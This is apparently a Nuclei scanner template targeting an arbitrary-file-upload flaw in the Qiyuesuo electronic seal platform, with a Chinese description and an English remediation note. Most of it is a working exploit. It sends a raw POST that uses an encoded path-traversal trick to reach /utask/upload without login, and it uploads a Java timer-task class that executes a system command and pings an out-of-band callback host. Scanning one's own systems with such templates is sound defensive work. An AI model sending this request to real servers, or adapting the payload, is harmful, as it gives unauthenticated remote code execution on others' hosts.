id: qiyuesuo-utask-upload-rce

info:
  name: Qiyuesuo Electronic Seal Platform utask/upload RCE
  author: qwtd
  severity: critical
  description: |
    契约锁电子签章系统 /login/%2e%2e/utask/upload 接口存在任意文件上传漏洞，攻击者可以通过该漏洞获取主机权限，该POC仅验证接口是否符合漏洞情况。
    solutions: 官方已发布更新补丁，请自行下载
    affected: 版本小于2023年8月之前
  remediation: |
    To mitigate this vulnerability, ensure that the system is updated to the latest version with all security patches applied. Additionally, implement strict input validation and sanitization on user inputs to prevent unauthorized command execution. Consider using a web application firewall (WAF) to filter and monitor HTTP requests for malicious activity.
  metadata:
    verified: true
  tags: 契约锁-电子签署平台

http:
  - raw:
      - |
        @timeout: 30s
        POST /login/%2e%2e/utask/upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R

        ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
        Content-Disposition: form-data; name="file"; filename="111.txt"
        Content-Type: text/plain

        package com;
        import com.qiyuesuo.utask.java.BaseTimerTask;
        import java.lang.reflect.Method;
        public class sleepPayload extends BaseTimerTask {
            static {try{Runtime.getRuntime().exec(new String[]{"ping","{{interactsh-url}}"});
            java.net.InetAddress.getByName("{{interactsh-url}}");}catch (Exception e){}}
        }
        ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--

    matchers-condition: or
    matchers:
      - type: word
        words:
          - '\u8BF7\u6C42\u6210\u529F'
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
